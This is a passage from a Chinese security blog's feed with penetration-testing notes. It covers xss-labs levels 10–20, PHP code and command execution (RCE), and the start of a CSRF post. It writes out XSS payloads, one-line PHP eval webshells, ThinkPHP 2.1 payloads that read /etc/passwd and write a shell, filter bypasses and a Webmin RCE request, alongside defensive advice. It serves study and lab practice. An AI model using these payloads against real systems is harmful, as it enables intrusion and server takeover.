class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>= <span class="string">alert(</span>`<span class="attr">xss</span>`)&gt;</span>//&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure><p>输入后，再点击页面即可触发onclick事件。</p><h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>与第10关的区别是双引号、&lt;&gt;被实体编码了。</p><p>但是可以看到多了一个名为t_ref的input标签，该标签的值也无法通过get方法赋予。但是根据名称，猜测来自referer。抓包，修改referer，发现响应体中的t_ref确实与请求头的referer字段的值相同。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20230917213236492.png" alt="image-20230917213236492" style="zoom:50%;"><p>使用BP或者hackbar提交referer即可。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">referer:&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>//&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20230917215234200.png" alt="image-20230917215234200"></p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>与第11关原理相同，只不过回显的字段从Referer换成了User-Agent。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//</span><br></pre></td></tr></table></figure><h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>与第11关原理相同，只不过回显的字段从Referer换成了Cookie。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//</span><br></pre></td></tr></table></figure><h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p><a href="https://blog.csdn.net/qq_40929683/article/details/120422266">https://blog.csdn.net/qq_40929683/article/details/120422266</a></p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>传入src参数的值会被用于<code>ng-include</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?src=ccb</span><br><span class="line"></span><br><span class="line">// 查看页面html</span><br><span class="line">&lt;span class=&quot;ng-include:ccb&quot;&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure><p><code>ng-include</code>指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。</p><blockquote><p>ng-include如果单纯指定地址，必须要加引号</p><p>ng-include加载外部html，script标签中的内容不执行</p><p>ng-include加载外部html中含有style标签样式可以识别</p><p>ng-include 属性的值可以是一个表达式，返回一个文件名</p><p>默认情况下，包含的文件需要包含在同一个域名下。</p></blockquote><p>尝试通用的攻击语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&quot;&lt;script&gt;alert(1)&lt;/script&gt;  // </span><br></pre></td></tr></table></figure><p>发现双引号被过滤，&lt;&gt;被实体编码，只能使用其他XSS语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加载同一域名下的外部文件level1.php，同时传入参数name</span><br><span class="line">?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure><p>这样该页面就会包含level1.php，并传入name参数<code>&lt;img src=1 onerror=alert(1)&gt;&#39;</code>，由于在解析src时出错，所以触发onerror。</p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h3><p>尝试如下语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">?keyword=&lt;img src=1 οnerrοr=alert(&#x27;xss&#x27;) &gt;</span><br></pre></td></tr></table></figure><p>发现script被注释，空格和&#x2F;均被转义。</p><p>尝试使用%0A替换空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="level-17-20"><a href="#level-17-20" class="headerlink" title="level 17-20"></a>level 17-20</h3><p>flash XSS，与swf文件相关。</p><p><a href="https://blog.csdn.net/qq_40929683/article/details/120422266">https://blog.csdn.net/qq_40929683/article/details/120422266</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/png/2476579/162813291</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>RCE代码及命令执行</title>
    <link href="https://frankcao3.github.io/posts/2282"/>
    <id>https://frankcao3.github.io/posts/2282</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T12:00:57.177Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCE-代码及命令执行漏洞"><a href="#RCE-代码及命令执行漏洞" class="headerlink" title="RCE 代码及命令执行漏洞"></a>RCE 代码及命令执行漏洞</h1><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628823541359-475e91f5-4f42-44a6-b59c-7b35fcb644ac.png" alt="RCE.png"></p><p><strong>remote command&#x2F;code execute</strong> 分为<strong>远程命令执行</strong>和<strong>远程代码执行</strong>。</p><p>在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用<u>代码或命令执行函数</u>去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p><h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>应用有时需要调用一些执行系统命令的函数，如PHP中的<strong>system</strong>、<strong>exec</strong>、<strong>assert</strong>、<strong>eval</strong>、<strong>preg_replace</strong>、<strong>shell_exec</strong>、<strong>passthru</strong>、<strong>popen</strong>、<strong>proc_popen</strong>、<strong>escapeshellcmd</strong>、<strong>pcntl_exec</strong>、<strong>call_user_func</strong>、<strong>call_user_func_array</strong>、<strong>array_map</strong>、<strong>动态函数</strong> 等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行，这就是命令执行漏洞。</p><p>以上函数主要也在webshell中用的多，实际上在正常应用中差别不太大，用得最多的还是前三个。</p><h3 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h3><p><strong>web源码</strong>：thinkphp、eyoucms、wordpress</p><p><strong>中间件平台</strong>：tomcat、struts2、redis</p><p><strong>其他平台</strong>：php-cgi、jenkins-cl、java-RMI</p><p>可以进一步参考vulhub中的漏洞。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>执行任意代码</li><li>向网站写WebShell</li><li>控制整个网站甚至服务器</li></ul><p>例如获取服务器网络配置、php版本信息：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804103952499.png" alt="image-20220804103952499"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804104032041.png" alt="image-20220804104032041"></p><h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><p>eval() 函数<strong>把字符串按照 PHP 代码来计算</strong>。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p><p>在服务器上创建一下代码test.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>，</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>] ; </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看文件：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804103612237.png" alt="image-20220804103612237"></p><p>查看管理员：</p><p><img src="https://i0.hdslb.com/bfs/article/1809d2c695ee31ad7df983396c96fe9f2e56fb5a.png@831w_98h_progressive.webp" alt="img"></p><p>添加管理员：</p><p><img src="https://i0.hdslb.com/bfs/article/42c39426697b4bf2945f925da0de0748f9bc0fce.png@696w_65h_progressive.webp" alt="img"></p><h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持动态调用，但是在php7.0.29之后的版本不支持动态调用</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">?</span><br></pre></td></tr></table></figure><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>此函数的作用是对一个字符串进行正则处理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> $ pattern , <span class="keyword">mixed</span> $ replacement , <span class="keyword">mixed</span> $ subject [, <span class="keyword">int</span> $ limit = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;$ count ]] )</span><br></pre></td></tr></table></figure><h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><p>把第一参数作为回调函数</p><h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h4><p>调用回到函数，并把第一个数组参数作为回到函数的参数</p><h4 id="array-map"><a href="#array-map" class="headerlink" title="array_ map()"></a>array_ map()</h4><p>为数组的每个元素应用回调函数</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>一般找CMS相应版本漏洞，如<strong>ThinkPHP2.1</strong></p><ul><li><p>一句话木马</p><p>给语句加上了${}，令其为变量，可作为动态函数执行。</p><p><code>http://www.xxx.com/News/detail/id/&#123;$&#123;@eval($_POST[aa])&#125;&#125;</code></p></li><li><p>得到当前路径<br><code>http://www.xxx.com/News/detail/id/&#123;$&#123;print(getcwd()))&#125;&#125;</code></p></li><li><p>读文件<br><code>http://www.xxx.com/News/detail/id/&#123;$&#123;exit(var_dump(file_get_contents($_POST[&#39;f&#39;])))&#125;&#125;</code><br>POST的数据为：<code>f=/etc/passwd</code></p></li><li><p>写shell<br><code>http://www.xxx.com/News/detail/id/&#123;$&#123;exit(var_dump(file_put_contents($_POST[&#39;f&#39;],$_POST[d])))&#125;&#125;</code><br>POST的数据为：<code>f=1.php&amp;d=&lt;?php @eval($_POST[&#39;aa&#39;])?&gt;</code></p></li></ul><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li><p>少用或禁用命令执行函数</p><p>尽量<strong>少用</strong>执行命令的函数或者直接<strong>禁用</strong>。能使用脚本解决的工作，不要调用其他程序处理。尽量少用执行命令的函数，并在<strong>disable_functions</strong>中禁用</p></li><li><p>确保动态执行的函数为指定的函数</p><p>在使用动态函数之前，确保使用的函数是<strong>指定的函数</strong>之一</p></li><li><p>参数用引号括起，且进行过滤或固定</p><p>在进入执行命令的函数&#x2F;方法之前，<strong>对参数进行过滤，对敏感字符进行转义</strong>。参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</p><p>对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤，对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤</p></li></ul><p>而针对由特定第三方组件引发的漏洞，我们要做的就是及时打补丁，修改安装时的默认配置。</p><p>对于eval( )函数一定要保证用户不能轻易接触eval的参数或者用正则严格判断输入的数据格式。</p><p><strong>对于preg_replace放弃使用&#x2F;e修饰符</strong>。如果必须要用e修饰符，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹 。</p><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>用户通过浏览器提交操作系统执行命令，由于服务器端 <strong>没有针对执行函数做过滤</strong>，导致在没有指定绝对路径的情况下就执行命令，可能会允许使用者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p><p>在操作系统中，<code>&amp;</code>、<code>|</code>、<code>||</code>都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。（<code>||</code>只要满足第一个条件，后面的条件就不再判断，而<code>|</code>要对所有的条件进行判断）</p><p><strong>Windows系统命令拼接：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“|”：管道符，前面命令标准输出作为后面命令的标准输入。</span><br><span class="line">“&amp;” commandA &amp; commandB 先运行命令A，然后运行命令B</span><br><span class="line">“||” commandA || commandB 运行命令A，如果失败则运行命令B</span><br><span class="line">“&amp;&amp;” commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</span><br></pre></td></tr></table></figure><p>例题：<a href="https://blog.csdn.net/m0_62851980/article/details/124166126">https://blog.csdn.net/m0_62851980/article/details/124166126</a></p><h3 id="产生-1"><a href="#产生-1" class="headerlink" title="产生"></a>产生</h3><p><strong>web源码</strong>：Nexus、Webmin、ElasticSearch</p><p><strong>中间件平台</strong>：Weblogic、Apache、Postgresql</p><p><strong>其他环境</strong>：Samba、Supervisord</p><h3 id="函数介绍-1"><a href="#函数介绍-1" class="headerlink" title="函数介绍"></a>函数介绍</h3><h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(command, return_var)</span><br></pre></td></tr></table></figure><p>其中，command是要执行的命令，return_var存放执行命令的执行后的状态值。</p><h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>exec函数可以用来执行一个外部的应用程序。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span> (command, output, return_var)</span><br></pre></td></tr></table></figure><p>其中，command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值</p><h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>passthru函数可以用来执行一个UNIX系统命令并显示原始的输出。</p><p>当UNIX系统命令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替代system与exec函数。</p><p>Passthru函数原型如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span> (command, return_var)</span><br></pre></td></tr></table></figure><p>其中，command是要执行的命令，return_var存放执行命令后的状态值。</p><h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h4><p>执行shell命令并返回输出的字符串，函数原型如下：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">shell_exec</span>(command)</span><br></pre></td></tr></table></figure><p>其中，command是要执行的命令。</p><h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>不返回执行结果，而是返回一个文件指针。</p><h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h4><h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h4><p>在当前进程空间执行指定程序</p><h4 id="echo"><a href="#echo" class="headerlink" title="echo()"></a>echo()</h4><p>若php代码中，<strong>echo后跟的是反引号括起的内容，则会将该内容作为代码执行并输出结果</strong>，实际调用的将是Shell_exec()。</p><p><a href="https://blog.csdn.net/qq_37348714/article/details/108859203">https://blog.csdn.net/qq_37348714/article/details/108859203</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20200928223911994.png" alt="在这里插入图片描述"></p><p>以墨者学院PHP代码分析溯源（第4题）为例：</p><p>有一网站，已知其php源码内容如下。由于存在解码和压缩函数，因此在在线运行中跑一下得到执行结果，其中echo的内容就是反引号括起的，所以会存在代码执行：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804161324103.png" alt="image-20220804161324103"></p><p>然后进一步使用参数a来进行命令执行：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804161658527.png" alt="image-20220804161658527"></p><p>看到该网站下有一个key开头的php文件，查看该文件内容（注意使用tac绕过对cat命令的过滤）：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804161852678.png" alt="image-20220804161852678"></p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ul><li><p>尽量不要使用命令执行函数</p></li><li><p>客户端提交的变量在进入执行命令函数方法之前，一定要做好过滤，对敏感字符进行转义</p></li><li><p>在使用动态函数之前，确保使用的函数是指定的函数之一</p></li><li><p>对PHP语言来说，不能完全控制的危险函数最好不要使用</p></li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>绕过对空格的检查：</p><p>比如<code>cat flag.txt</code>，要替换掉空格，且保持仍可执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$IFS$<span class="number">1</span>　　　　　　<span class="comment">//$1改成$加其他数字都行，都能当作空格来用</span></span><br><span class="line"></span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line"></span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line"></span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure><p>绕过关键词：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac flag.txt</span><br></pre></td></tr></table></figure><h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><ul><li><p><strong>代码审计</strong></p><p>最主要的方式，借助代码审计工具，非常方便的审计出此类漏洞</p></li><li><p><strong>已知的CMS漏洞</strong></p></li></ul><p>已知的CMS，有很多每年都会爆出来很多此类的漏洞</p><ul><li><p><strong>页面传参查找</strong></p><pre><code>  针对页面有传参的地方，重点关注传入恶意代码尝试，概率相对较低</code></pre></li></ul><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="墨者靶场黑盒层-RCE-漏洞检测-公开漏洞"><a href="#墨者靶场黑盒层-RCE-漏洞检测-公开漏洞" class="headerlink" title="墨者靶场黑盒层 RCE 漏洞检测-公开漏洞"></a>墨者靶场黑盒层 RCE 漏洞检测-公开漏洞</h3><p><strong>Webmin未经身份验证的远程代码执行</strong></p><p>Webmin是基于Web的Unix系统管理工具。为了降低 Linux系统的管理难度，有时候会对公司内的Linux主机或VPS系统预装了网页管理工具webmin。</p><p>Webmin的RCE漏洞存在于密码重置页面中。该页面允许未经身份验证的用户通过简单的POST请求执行任意命令。</p><p><a href="https://www.cnblogs.com/whoami101/p/11465877.html">https://www.cnblogs.com/whoami101/p/11465877.html</a></p><p>在注册界面提交后BP抓包，将post的URL改为<code>/password_change.cgi</code>（修改密码的URL），post请求主体改为old等参数。其中使用old参数作为命令执行的入口，令old&#x3D;{shell}：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/009994f56d66a163e07fa85f74ccc4c5737559ec.png@692w_365h_progressive.webp" alt="img"></p><p>这里old&#x3D;ls，所以输出了服务器的当前文件目录（这里是直接在浏览器F12调试中修改的数据包）：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804163823614.png" alt="image-20220804163823614"></p><p>然后令old&#x3D;&#x2F;key.txt读取文件，获得flag。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804164230310.png" alt="image-20220804164230310"></p><h3 id="Javaweb-Struts2-框架类-RCE-漏洞-漏洞层面"><a href="#Javaweb-Struts2-框架类-RCE-漏洞-漏洞层面" class="headerlink" title="Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面"></a>Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面</h3><p><strong>Apache Struts2远程代码执行漏洞（S2-037复现）</strong></p><p>Struts2漏洞检查工具2019版 V2.3 by shack2 20190927</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804190810468.png" alt="image-20220804190810468"></p><p>struts2漏洞扫描工具：<strong>Struts2-Scan</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#工具参数说明（Struts2批量扫描利用工具）：</span><br><span class="line"></span><br><span class="line">---Usage: Struts2Scan.py [OPTIONS]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -i, --info          漏洞信息介绍</span><br><span class="line">  -v, --version       显示工具版本</span><br><span class="line">  -u, --url TEXT      URL地址</span><br><span class="line">  -n, --name TEXT     指定漏洞名称, 漏洞名称详见info</span><br><span class="line">  -f, --file TEXT     批量扫描URL文件, 一行一个URL</span><br><span class="line">  -d, --data TEXT     POST参数, 需要使用的payload使用&#123;exp&#125;填充</span><br><span class="line">  -c, --encode TEXT   页面编码, 默认UTF-8编码</span><br><span class="line">  -p, --proxy TEXT    HTTP代理. 格式为http://ip:port</span><br><span class="line">  -t, --timeout TEXT  HTTP超时时间, 默认10s</span><br><span class="line">  -w, --workers TEXT  批量扫描进程数, 默认为10个进程</span><br><span class="line">  --header TEXT       HTTP请求头, 格式为: key1=value1&amp;key2=value2</span><br><span class="line">  -e, --exec          进入命令执行shell</span><br><span class="line">  --webpath           获取WEB路径</span><br><span class="line">  -r, --reverse TEXT  反弹shell地址, 格式为ip:port</span><br><span class="line">  --upfile TEXT       需要上传的文件路径和名称</span><br><span class="line">  --uppath TEXT       上传的目录和名称,如:/usr/local/tomcat/webapps/ROOT/shell.jsp</span><br><span class="line">  -q, --quiet         关闭打印不存在漏洞的输出，只保留存在漏洞的输出</span><br><span class="line">  -h, --help          Show this message and exit.</span><br></pre></td></tr></table></figure><p><strong>专业话语：</strong></p><p>EXP：Exploit漏洞利用代码，运行之后对目标进行攻击。<br>POC：Proof of Concept漏洞验证代码，检测目标是否存在对应漏洞。</p><h3 id="一句话-Webshell-后门原理代码执行-拓展说明"><a href="#一句话-Webshell-后门原理代码执行-拓展说明" class="headerlink" title="一句话 Webshell 后门原理代码执行-拓展说明"></a>一句话 Webshell 后门原理代码执行-拓展说明</h3><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804192441723.png" alt="image-20220804192441723"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804192548559.png" alt="image-20220804192548559"></p><p>菜刀将操作系统的命令写入参数，以post方式传递给网站后门，网站后门通过eval()代码执行来执行系统命令或者代码，从而达到了菜刀远程操作服务器的目的.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RCE-代码及命令执行漏洞&quot;&gt;&lt;a href=&quot;#RCE-代码及命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;RCE 代码及命令执行漏洞&quot;&gt;&lt;/a&gt;RCE 代码及命令执行漏洞&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CSRF、SSRF</title>
    <link href="https://frankcao3.github.io/posts/25956"/>
    <id>https://frankcao3.github.io/posts/25956</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T12:00:50.107Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。利用了网站服务器只能检查发起请求的是不是用户的浏览器，而无法检查发起请求的是不是用户本意的这一漏洞。通常由于服务端没有对请求头做严格过滤引起的。</p><p><u>XSS利用的是站点内的信任用户</u>，由信任用户执行了含有恶意前端脚本的页面产生，攻击对象是访问页面的用户。而<u>CSRF则是通过搭建外部网站，受害者访问网站时被攻击者利用，通过盗取受害者身份，伪装来自受信任用户的请求来执行对受信任网站的攻击</u>。</p><p>CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。我们知道，绝大多数网站是通过cookie等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过XSS或链接欺骗等途径（在XSS中嵌入CSRF的链接），让用户在本机（即拥有身份cookie的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/4dca552031d4403d9edc193d4a48d759.png"></p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801105831026.png" alt="image-20220801105831026" style="zoom: 67%;"><p>可能出现该漏洞的地方：</p><p><strong>存在添加、修改、删除操作的页面</strong>。</p><p>仅有查询的页面不会有该漏洞。</p><p>一般出现在中小型的网站，不属于严重漏洞。大型网站一般也比较安全，不会有这种漏洞。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>以pikachu靶场为例，在修改个人信息的页面点击提交。通过BP抓包可以看到所填写的个人信息是通过get方式提交的：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803094611582.png" alt="image-20220803094611582"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803094522118.png" 